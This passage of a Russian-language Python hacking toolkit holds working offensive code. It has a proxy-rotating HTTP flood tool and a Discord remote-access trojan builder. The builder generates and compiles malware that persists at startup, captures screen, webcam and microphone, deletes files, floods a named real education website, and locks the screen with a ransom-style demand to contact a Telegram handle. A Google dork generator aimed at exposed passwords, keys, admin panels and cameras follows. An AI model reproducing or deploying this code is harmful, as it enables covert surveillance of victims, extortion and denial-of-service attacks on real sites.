            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate, br',
        }
        
        successful_requests = 0
        failed_requests = 0
        start_time = time.time()
        
        print(f"🎯 ДЕТАЛЬНАЯ АТАКА НАЧАТА")
        print(f"🌐 Сайт: {url}")
        print(f"📊 Целевых запросов: {num_requests}")
        print(f"⚡ Потоков: {max_workers}")
        print(f"🔀 Прокси: {len(proxy_list)} (смена каждые {requests_per_proxy} запросов)")
        print("=" * 100)
        
        def worker(worker_id, requests_to_make):
            """Функция для worker-потока"""
            nonlocal successful_requests, failed_requests
            
            # Создаем сессию для каждого worker
            with requests.Session() as session:
                for i in range(requests_to_make):
                    request_num = worker_id * requests_to_make + i + 1
                    result = make_detailed_request(url, proxy_rotator, session, request_num, headers, 10)
                    
                    with threading.Lock():
                        if result['status'] == 'success':
                            successful_requests += 1
                            # Детальный вывод для успешных запросов
                            print(f"✅ [{result['request_number']:03d}] УСПЕХ")
                            print(f"   🔗 Сайт: {result['url']}")
                            print(f"   📍 Прокси: {result['proxy']}")
                            print(f"   📊 Статус: {result['status_code']}")
                            print(f"   📏 Длина: {result['content_length']} байт")
                            print(f"   ⏱️ Время: {result['response_time']:.2f}с")
                            if result['redirects'] != 'нет':
                                print(f"   🔄 Редиректы: {result['redirects']}")
                            print(f"   📈 Успешных: {successful_requests} | Ошибок: {failed_requests}")
                            print("-" * 80)
                        else:
                            failed_requests += 1
                            # Детальный вывод для ошибок
                            print(f"❌ [{result['request_number']:03d}] ОШИБКА")
                            print(f"   🔗 Сайт: {result['url']}")
                            print(f"   📍 Прокси: {result['proxy']}")
                            print(f"   💥 Ошибка: {result['error']}")
                            print(f"   📈 Успешных: {successful_requests} | Ошибок: {failed_requests}")
                            print("-" * 80)
        
        # Распределяем запросы между потоками
        requests_per_worker = num_requests // max_workers
        remaining_requests = num_requests % max_workers
        
        threads = []
        for i in range(max_workers):
            # Последний поток получает оставшиеся запросы
            worker_requests = requests_per_worker + (1 if i < remaining_requests else 0)
            if worker_requests > 0:
                thread = threading.Thread(target=worker, args=(i, worker_requests))
                threads.append(thread)
                thread.start()
        
        # Ждем завершения всех потоков
        for thread in threads:
            thread.join()
        
        total_time = time.time() - start_time
        
        print("=" * 100)
        print(f"🎯 АТАКА ЗАВЕРШЕНА!")
        print(f"✅ Успешных запросов: {successful_requests}")
        print(f"❌ Неудачных запросов: {failed_requests}")
        print(f"📈 Эффективность: {(successful_requests/num_requests)*100:.1f}%")
        print(f"⏱️ Общее время: {total_time:.2f} секунд")
        print(f"⚡ Средняя скорость: {num_requests/total_time:.2f} запросов/секунду")

    # Упрощенная версия с компактным выводом
    def compact_detailed_attack(url, proxy_list, num_requests=200, max_workers=50):
        """Компактный вывод с деталями"""
        
        print(f"🚀 Компактная атака на: {url}")
        print(f"Запросов: {num_requests} | Потоков: {max_workers} | Прокси: {len(proxy_list)}")
        print("-" * 120)
        
        current_proxy_index = 0
        request_count = 0
        success_count = 0
        error_count = 0
        lock = threading.Lock()
        
        def compact_worker():
            nonlocal current_proxy_index, request_count, success_count, error_count
            
            session = requests.Session()
            
            for _ in range(num_requests // max_workers):
                with lock:
                    proxy = proxy_list[current_proxy_index]
                    current_proxy_index = (current_proxy_index + 1) % len(proxy_list)
                    request_count += 1
                    current_request = request_count
                
                try:
                    start = time.time()
                    response = session.get(
                        url, 
                        proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'},
                        timeout=5,
                        headers={'User-Agent': 'Mozilla/5.0'}
                    )
                    end = time.time()
                    
                    with lock:
                        success_count += 1
                        # Компактный вывод в одну строку
                        print(f"\033[32m [{current_request:03d}] {proxy} | {response.url[:50]}... | Status: {response.status_code} | Size: {len(response.content)} | Time: {end-start:.2f}s\033[0m")

                        
                except Exception as e:
                    with lock:
                        error_count += 1
                        print(f"\033[31m [{current_request:03d}] {proxy} | {url[:50]}... | Error: {str(e)[:30]}...\033[0m")

        
        start = time.time()
        threads = []
        
        for _ in range(max_workers):
            t = threading.Thread(target=compact_worker)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        total_time = time.time() - start
        print("-" * 120)
        print(f"Итог: {success_count} успешно, {error_count} ошибок за {total_time:.2f}с ({success_count/total_time:.1f} запр/сек)")

    # Запуск
    if __name__ == "__main__":
        # Загружаем прокси
        proxies = load_proxies_from_file("proxy.txt")
        
        if not proxies:
            print("Добавьте прокси в файл proxy.txt!")
            exit(1)
        
        target_url = xx  # ЗАМЕНИТЕ НА ВАШ URL22
        
        choice = input("enter 1 : ")
        
        if choice == "98765654":
            detailed_attack(
                url=target_url,
                proxy_list=proxies,
                num_requests=50,       # Количество запросов
                max_workers=10,        # Количество потоков
                requests_per_proxy=100   # Смена прокси каждые 5 запросов
            )
        else:
            compact_detailed_attack(
                url=target_url,
                proxy_list=proxies,
                num_requests=1000000,      # Количество запросов
                max_workers=20         # Количество потоков
            )
def dc_rat():
    def build_bot():
        logo = '''
             .     .              ..:     .               .     .               .     .             
           .          ...=****#%%%%%%*=                 .                   ....        .           
 .       .             .%%%%%%%%%%%%%%%%#.    .      .                   .....            .       . 
   ....                  *%%%%%%%%%%%%%%%%+     .::.                  . .. .                 ..     
   .:..                  =%%@%%%%%%%%%%%%%%*    .::.                .....                    ..     
  .                     =%%%%%%%%%%%%%%%%%%%* ..     .             ....    .                      . 
.         .           ..%%%%%%%%%%%%%%%%%%%%%.                  ....          .                     
             .     .   .%%%%%%%%%%%%%%%%%%%%%%.          ..    ...  ...               .             
               ..       %%%%%%%%.=%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%+.      .::.               
               ...     .%%%%%%-  =%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%       .::               
           . .     .    %%%%%.   =%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.    .     .             
.        ....         .          =%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%. .                     .
      .....                  ...  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.                   .....
    . ..                  ..:.    -%%%%%%%%%%%%%%*%%%%%%%%%%%%%%%%%%%%%@%%%=                 ...    
 ......                  .:. .     -%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.=%%%%%+              .....     
...                    ..      .    @%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  .=%%%%.          ......     . 
.         ..                     .. @%%%%% ... ...  .   . #%%%%%%%%#     ..*+ .        ...          
             .     .                @%%%%%                .%%%%%%%%#            .                   
               .::                  @%#%%%                 .%=+%%%%#              ...               
               ....                 @%%%%%                ..:.%%%%%#                ..              
            .      ..           ....@%%%%%               .     #%%%#        .....     ..            
.         .           .        .....:+#:.%   .        .       .:=#-.        ...                     
       .                .   ......%%%%%%%%+                  %%%%%%%%#.  ....                    .  
    ...                   :#%*%%=*%%   .*%%:%%%%%#%%%%%%%%%#-%%:   =%%=*%#:                  .::.   
    .  .               ...:#%%%%+*%%.   *%%:%%%%%%%%%%%%%%%%-%%-  .=#*-*%%=                 .....   
..       .          .....         #%%%%%%%=   .      .       *%%%##*#*     .              .         
.                   ..            .  :-.                .      ..-.              
        '''
        print(logo)
        print("Discord RAT-Bot Builder")

        token = input("token: ").strip()
        if not token:
            print("Токен не может быть пустым!")
            return



        bot_code = f'''
import discord
from discord.ext import commands
import pyautogui
import cv2
import os
import webbrowser
import time
import numpy as np
import pyaudio
import wave
import asyncio
import shutil
import socket
import threading
import aiohttp
import subprocess
import platform
import requests
import re
import winreg as reg
from PIL import ImageGrab

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

def add_to_startup_easiest():
    try:
        if not getattr(sys, 'frozen', False):
            return False
        current_file = sys.executable
        startup_dir = r"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp"
        os.makedirs(startup_dir, exist_ok=True)
        startup_file = os.path.join(startup_dir, "SystemHelper.exe")
        shutil.copy2(current_file, startup_file)
        return True
    except Exception as e:
        return False

add_to_startup_easiest()

def get_system_info():
    try:
        external_ip = requests.get('https://api.ipify.org').text
    except:
        external_ip = "Не удалось получить"
    try:
        hostname = socket.gethostname()
        internal_ip = socket.gethostbyname(hostname)
    except:
        internal_ip = "Не удалось получить"
    try:
        gpu_info = "Не определено"
        if platform.system() == "Windows":
            result = subprocess.check_output([
                'wmic', 'path', 'win32_VideoController', 'get', 'name'
            ], text=True)
            gpu = result.split('\\\\n')[1].strip()
            if gpu:
                gpu_info = gpu
    except:
        gpu_info = "Не определено"
    info = {{
        'OS': f"{{platform.system()}} {{platform.release()}}",
        'Процессор': platform.processor(),
        'Имя ПК': platform.node(),
        'Внешний IP': external_ip,
        'Внутренний IP': internal_ip,
        'Пользователь': os.getlogin(),
        'Видеокарта': gpu_info
    }}
    return info

@bot.command()
async def info(ctx):
    system_info = get_system_info()
    message = "**Системная информация:**\\\\n"
    for key, value in system_info.items():
        message += f"**{{key}}:** {{value}}\\\\n"
    await ctx.send(message)

@bot.event
async def on_ready():
    print(f"Бот {{bot.user}} подключен!")

@bot.command()
async def record_desktop(ctx, seconds: int = 10):
    if seconds <= 0:
        return
    if seconds > 30:
        seconds = 30
    video_file = f"desktop_{{ctx.message.id}}.avi"
    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(video_file, fourcc, 20.0, screen_size)
    start_time = time.time()
    while time.time() - start_time < seconds:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        out.write(frame)
    out.release()
    if os.path.exists(video_file):
        await ctx.send(file=discord.File(video_file))
        os.remove(video_file)

@bot.command()
async def start(ctx):
    await ctx.send("""
⠀⠀""")
    await ctx.send("Привет! Доступные команды:")
    await ctx.send("!info - информацыя о пк жертвы")
    await ctx.send("!veb_vid 10 - видео с веб камеры (секунды можно менять макс. - 30 с)")
    await ctx.send("!record_desktop 10 - видео с робочиго стола (секунды можно менять макс. - 30 с)")
    await ctx.send("!ip - айпи зараженого пк")
    await ctx.send("!ls - посмотреть файлы в папке")
    await ctx.send("!screenshot - сделать скриншот рабочего стола")
    await ctx.send("!web - фото с веб-камеры")
    await ctx.send("!site <url> - открыть сайт на ПК")
    await ctx.send("!ls - просмотр всех папок а если надо конкретную !ls (путь или название папки)")
    await ctx.send("!delete - удаляет папку или файл по пути")
    await ctx.send("!off_pc - выключает пк")
    await ctx.send("!winlock <пароль> - запускает вин локер с паролем который вы укажыте")
    await ctx.send("!kill code.exe- выключает програму которую вы укажыте")

@bot.command()
async def ls(ctx, *, folder: str = None):
    folder = folder or "C:\\\\" if os.name == "nt" else "/"
    if os.path.exists(folder) and os.path.isdir(folder):
        files = os.listdir(folder)
        await ctx.send("\\\\n".join(files) if files else "Папка пуста.")
    else:
        await ctx.send("Папка не найдена.")

@bot.command()
async def ip(ctx):
    await ctx.send("IP:" + requests.get('https://api.ipify.org').text)

@bot.command()
async def veb_vid(ctx, seconds: int):
    if seconds <= 0:
        await ctx.send("Время должно быть больше 0 секунд")
        return
    if seconds > 30:
        seconds = 30
    video_file = f"video_{{ctx.message.id}}.avi"
    audio_file = f"audio_{{ctx.message.id}}.wav"
    recording = True

    def record_audio():
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        p = pyaudio.PyAudio()
        device_index = p.get_default_input_device_info()['index']
        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        input_device_index=device_index,
                        frames_per_buffer=CHUNK)
        frames = []
        start_time = time.time()
        while recording and time.time() - start_time < seconds:
            try:
                data = stream.read(CHUNK)
                frames.append(data)
            except:
                break
        stream.stop_stream()
        stream.close()
        p.terminate()
        with wave.open(audio_file, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))

    def record_video():
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(video_file, fourcc, 20.0, (640, 480))
        start_time = time.time()
        while recording and time.time() - start_time < seconds:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
        cap.release()
        out.release()

    audio_thread = threading.Thread(target=record_audio)
    video_thread = threading.Thread(target=record_video)
    audio_thread.start()
    video_thread.start()
    time.sleep(seconds + 1)
    recording = False
    audio_thread.join()
    video_thread.join()
    if os.path.exists(video_file):
        await ctx.send(file=discord.File(video_file))
    if os.path.exists(audio_file):
        await ctx.send(file=discord.File(audio_file))
    if os.path.exists(video_file):
        os.remove(video_file)
    if os.path.exists(audio_file):
        os.remove(audio_file)

@bot.command()
async def kill(ctx, process_name: str):
    if not re.match(r'^[a-zA-Z0-9_.-]+$', process_name):
        await ctx.send("Ошибка: Недопустимое имя процесса.")
        return
    try:
        result = subprocess.run(
            ["taskkill", "/f", "/im", process_name],
            capture_output=True,
            text=True,
            timeout=10
        )
        if result.returncode == 0:
            await ctx.send(f"Процесс {{process_name}} успешно завершён.")
        else:
            error_msg = result.stderr.strip()
            await ctx.send(f"Ошибка при завершении процесса: {{error_msg}}")
    except subprocess.TimeoutExpired:
        await ctx.send("Команда превысила время выполнения.")

@bot.command()
async def screenshot(ctx):
    img = ImageGrab.grab()
    img.save("screenshot.png")
    await ctx.send(file=discord.File("screenshot.png"))

@bot.command()
async def off_pc(ctx):
    os.system("shutdown /s /t 0")

@bot.command()
async def web(ctx):
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    cam.release()
    if ret:
        cv2.imwrite("webcam_photo.jpg", frame)
        await ctx.send(file=discord.File("webcam_photo.jpg"))
    else:
        await ctx.send("Не удалось получить изображение с камеры")

@bot.command()
async def ded_pc(ctx):
    import requests
    import threading
    import random
    import time
    TARGET_URL = "https://vseosvita.ua/"
    THREAD_COUNT = 500000
    USE_POST = False
    ENABLE_CPU_LOAD = True
    request_count = 0
    failed_count = 0
    stop_signal = 
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
    ]
    vulnerable_paths = [
        '/search?q=',
        '/api/v1/users',
        '/wp-admin/admin-ajax.php',
        '/graphql',
        '/phpmyadmin/index.php',
        '/admin/login',
        '/slow-page.php'
    ]

    def generate_cpu_load():
        for _ in range(1000):
            _ = 93485934 * 23849234 / 234223

    def attack_worker():
        global request_count, failed_count
        session = requests.Session()
        while not stop_signal:
            try:
                headers = {{'User-Agent': random.choice(user_agents)}}
                rand_param = f'?cache_buster={{random.randint(1000000, 9999999)}}'
                final_url = TARGET_URL + rand_param
                if USE_POST:
                    post_data = {{
                        'username': f'test{{random.randint(1, 10000)}}',
                        'password': f'pass{{random.randint(1, 10000)}}',
                        'csrf': f'token{{random.randint(1000, 9999)}}'
                    }}
                    response = session.post(final_url, data=post_data, headers=headers, timeout=3)
                else:
                    if random.random() > 0.6 and TARGET_URL.endswith('/'):
                        exploit_url = TARGET_URL + random.choice(vulnerable_paths)[1:] + rand_param
                        response = session.get(exploit_url, headers=headers, timeout=3)
                    else:
                        response = session.get(final_url, headers=headers, timeout=3)
                request_count += 1
                if ENABLE_CPU_LOAD:
                    generate_cpu_load()
            except requests.exceptions.RequestException:
                failed_count += 1
                continue
            except KeyboardInterrupt:
                break

    def stats_printer():
        last_count = 0
        last_time = time.time()
        while not stop_signal:
            time.sleep(2)
            current_count = request_count
            current_time = time.time()
            rps = (current_count - last_count) / (current_time - last_time)
            last_count = current_count
            last_time = current_time

    stats_thread = threading.Thread(target=stats_printer)
    stats_thread.daemon = True
    stats_thread.start()
    threads = []
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=attack_worker)
        t.daemon = True
        threads.append(t)
        t.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_signal = True

@bot.command()
async def dos(ctx, url: str):
    async def fetch_url(session, request_num):
        try:
            async with session.get(url) as response:
                text = await response.text()
                print(f"{{request_num}}Запрос -->{{url}} | Статус: {{response.status}} | Длина: {{len(text)}}")
        except Exception as e:
            print(f"Ошибка в запросе #{{request_num}}: {{e}}")

    async def make_requests():
        num_requests = 9999
        print('полители)')
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(1, num_requests + 1):
                task = asyncio.create_task(fetch_url(session, i))
                tasks.append(task)
            await asyncio.gather(*tasks)
    asyncio.run(make_requests())

@bot.command()
async def site(ctx, url: str):
    webbrowser.open(url)
    await ctx.send(f"Сайт {{url}} открыт!")

@bot.command()
async def delete(ctx, file: str):
    os.remove(file)
    await ctx.send(f"файл {{file}} удален!")

@bot.command()
async def winlock(ctx, CORRECT_PASSWORD: str):
    def check_password(event):
        global unlocked
        if password_entry.get() == CORRECT_PASSWORD:
            unlocked = True
            root.destroy()

    destruction_time = 5400
    unlocked = False
    root = tkinter.Tk()
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    font_main = ("Arial", 25, "bold")
    bg_color = "black"
    keyboard.block_key('left windows')
    keyboard.block_key('right windows')
    keyboard.block_key('alt')
    keyboard.block_key('f4')
    keyboard.block_key('ctrl')
    keyboard.block_key('delete')
    keyboard.block_key('esc')
    root["bg"] = bg_color
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.attributes("-topmost", True)
    root.overrideredirect(True)
    root.geometry(f"{{screen_width}}x{{screen_height}}")
    logo = """
        XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
        XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
        XX                                                                          XX
        XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
        XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
        XX   MMMMMy''                                                    ''yMMMMM   XX
        XX   MMMy'                                                          'yMMM   XX
        XX   Mh'                                                              'hM   XX
        XX   -                                                                  -   XX
        XX                                                                          XX
        XX   ::                                                                ::   XX
        XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
        XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
        XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
        XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
        XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
        XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
        XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
        XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
        XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
        XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
        XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
        XX                                oo      oo                                XX
        XX           oM                 oo          oo                 Mo           XX
        XX         oMMo                M              M                oMMo         XX
        XX       +MMMM                 s              s                 MMMM+       XX
        XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
        XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
        XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
        XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
        XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
        XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
        XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
        XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
        XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
        XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
        XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
        XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
        XX   MMMMMMMM-                                                  -MMMMMMMM   XX
        XX   MMMMMMMMM                                                  MMMMMMMMM   XX
        XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
        XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
        XX                                                                          XX
        XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
        XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
        ⠀⠀"""
    tkinter.Label(root, text=logo, fg="red", bg=bg_color, font=("Courier", 4)).pack()
    tkinter.Label(root, text="для розблакировки пк напишыте нам в Telegram -- @ufufufhc77 ", fg="red", bg=bg_color,
                font=("Courier", 24)).pack()
    tkinter.Label(root, text="Ваш Windows заблокирован!", fg="red", bg=bg_color, font=font_main).pack()
    tkinter.Label(root, text="Введите пароль:", fg="white", bg=bg_color, font=font_main).pack()
    password_entry = tkinter.Entry(root, font=font_main, show="*")
    password_entry.pack()
    password_entry.bind("<Return>", check_password)
    tkinter.Label(root, text="", fg="red", bg=bg_color, font=("Arial", 18)).pack()
    root.mainloop()

bot.run("{token}")
'''

        with open("discord_rat.py", "a", encoding="utf-8") as f:
            f.write(f"{bot_code}\n")
        os.system("pyinstaller --onefile --noconsole discord_rat.py")


    build_bot()


def dork():
    def generate_google_dork_urls(search_term):
        base_url = "https://www.google.com/search?q="
        categories = {
            "BASIC SEARCHES": [
                f'"{search_term}"',
                f'intext:"{search_term}"',
                f'intitle:"{search_term}"',
                f'inurl:"{search_term}"',
                f'site:*.* "{search_term}"',
            ],
            "FILE SEARCH": [
                f'filetype:pdf "{search_term}"',
                f'filetype:doc "{search_term}"',
                f'filetype:docx "{search_term}"',
                f'filetype:xls "{search_term}"',
                f'filetype:xlsx "{search_term}"',
                f'filetype:txt "{search_term}"',
                f'filetype:sql "{search_term}"',
                f'filetype:log "{search_term}"',
                f'filetype:csv "{search_term}"',
                f'filetype:xml "{search_term}"',
                f'filetype:json "{search_term}"',
                f'filetype:env "{search_term}"',
                f'filetype:cfg "{search_term}"',
                f'filetype:conf "{search_term}"',
                f'filetype:php "{search_term}"',
                f'filetype:js "{search_term}"',
                f'filetype:py "{search_term}"',
                f'filetype:java "{search_term}"',
            ],
            "SOCIAL NETWORKS": [
                f'site:facebook.com "{search_term}"',
                f'site:instagram.com "{search_term}"',
                f'site:twitter.com "{search_term}"',
                f'site:linkedin.com "{search_term}"',
                f'site:vk.com "{search_term}"',
                f'site:t.me "{search_term}"',
                f'site:reddit.com "{search_term}"',
                f'site:pinterest.com "{search_term}"',
                f'site:whatsapp.com "{search_term}"',
                f'site:telegram.org "{search_term}"',
            ],
            "PROGRAMMING & FORUMS": [
                f'site:github.com "{search_term}"',
                f'site:gitlab.com "{search_term}"',
                f'site:stackoverflow.com "{search_term}"',
                f'site:bitbucket.org "{search_term}"',
                f'site:pastebin.com "{search_term}"',
                f'site:justpaste.it "{search_term}"',
                f'site:hastebin.com "{search_term}"',
            ],
            "SECURITY & ADMIN PANELS": [
                f'intitle:"index of" "{search_term}"',
                f'inurl:"admin" "{search_term}"',
                f'inurl:"login" "{search_term}"',
                f'inurl:"config" "{search_term}"',
                f'inurl:"backup" "{search_term}"',
                f'inurl:"wp-admin" "{search_term}"',
                f'inurl:"phpmyadmin" "{search_term}"',
                f'inurl:"debug" "{search_term}"',
                f'inurl:"test" "{search_term}"',
                f'inurl:"secret" "{search_term}"',
                f'inurl:"password" "{search_term}"',
            ],
            "DATABASES & LOGINS": [
                f'"{search_term}" password',
                f'"{search_term}" pass',
                f'"{search_term}" username',
                f'"{search_term}" login',
                f'"{search_term}" user',
                f'"{search_term}" account',
                f'"{search_term}" database',
                f'"{search_term}" email',
                f'"{search_term}" mail',
            ],
            "KEYS & CONFIGS": [
                f'"{search_term}" key',
                f'"{search_term}" api',
                f'"{search_term}" token',
                f'"{search_term}" secret',
                f'"{search_term}" config',
                f'"{search_term}" setting',
                f'"{search_term}" backup',
                f'"{search_term}" dump',
                f'"{search_term}" sql',
            ],
            "NETWORKS & DEVICES": [
                f'inurl:"camera" "{search_term}"',
                f'inurl:"router" "{search_term}"',
                f'inurl:"config" "{search_term}"',
                f'inurl:"interface" "{search_term}"',
            ],
            "GEOGRAPHICAL": [
                f'location:"{search_term}"',
                f'near:"{search_term}"',
            ],
            "TEMPORAL": [
                f'after:2023 "{search_term}"',
                f'before:2023 "{search_term}"',
            ]
        }
        all_urls = {}
        for category_name, dorks in categories.items():
            category_urls = []
            for dork in dorks:
                encoded_dork = urllib.parse.quote_plus(dork)
                search_url = f"{base_url}{encoded_dork}"
                category_urls.append(search_url)
            all_urls[category_name] = category_urls
        return all_urls

    def show_categories_menu(categories):
        print("\n" + "=" * 60)
        print("SELECT SEARCH CATEGORIES:")
        print("=" * 60)
        category_names = list(categories.keys())
        for i, category in enumerate(category_names, 1):
            print(f"{i}. {category} ({len(categories[category])} links)")
        print(f"{len(category_names) + 1}. OPEN ALL AT ONCE ({sum(len(urls) for urls in categories.values())} links)")
        print(f"{len(category_names) + 2}. NEW SEARCH")
        print(f"{len(category_names) + 3}. EXIT")
        print("=" * 60)

    banner = """
         888               888   d8                               ,e,
888 88e  888 ee   e88 88e  888  d88   888 88e   e88 88e  888 88e   "   e88'888  ,"Y88b
888 888b 888 88b d888 888b 888 d88888 888 888b d888 888b 888 888b 888 d888  '8 "8" 888
888 888P 888 888 Y888 888P 888  888   888 888P Y888 888P 888 888P 888 Y888   , ,ee 888
888 88"  888 888  "88 88"  888  888   888 88"   "88 88"  888 88"  888  "88,e8' "88 888
888                                   888                888
888                                   888                888
    """

    def main():
        while True:
            print(banner)
            print("\n" + "=" * 50)
            print("GOOGLE DORK SEARCH TOOL")
            print("=" * 50)
            search_term = input("Enter search query (or 'exit' to quit): ").strip()
            if search_term.lower() in ['exit', 'quit']:
                print("Goodbye!")
                break
            if not search_term:
                print("Empty query, try again")
                continue
            all_urls = generate_google_dork_urls(search_term)
            total_links = sum(len(urls) for urls in all_urls.values())
            print(f"\nGenerated {total_links} links in {len(all_urls)} categories")
            while True:
                show_categories_menu(all_urls)
                try:
                    choice = input("\nSelect category numbers (space separated): ").strip()
                    if choice.lower() in ['exit', 'quit']:
                        break
                    if not choice:
                        continue
                    if choice == str(len(all_urls) + 1):
                        print(f"\nOpening ALL {total_links} links...")
                        for category_name, urls in all_urls.items():
                            print(f"\n{category_name}:")
                            for url in urls:
                                webbrowser.open_new_tab(url)
                                time.sleep(0.3)
                        print(f"\nOpened {total_links} links!")
                        break
                    elif choice == str(len(all_urls) + 2):
                        print("Starting new search...")
                        break
                    elif choice == str(len(all_urls) + 3):
                        print("Exiting...")
                        return
                    selected_numbers = list(map(int, choice.split()))
                    selected_categories = []
                    for num in selected_numbers:
                        if 1 <= num <= len(all_urls):
                            category_name = list(all_urls.keys())[num - 1]
                            selected_categories.append(category_name)
                        else:
                            print(f"Invalid number: {num}")
                    if selected_categories:
                        total_selected = sum(len(all_urls[cat]) for cat in selected_categories)
                        print(f"\nSelected categories: {', '.join(selected_categories)}")
                        print(f"Total links: {total_selected}")
                        print("\nLINKS FOR SELECTED CATEGORIES:")
                        print("-" * 80)
                        for category in selected_categories:
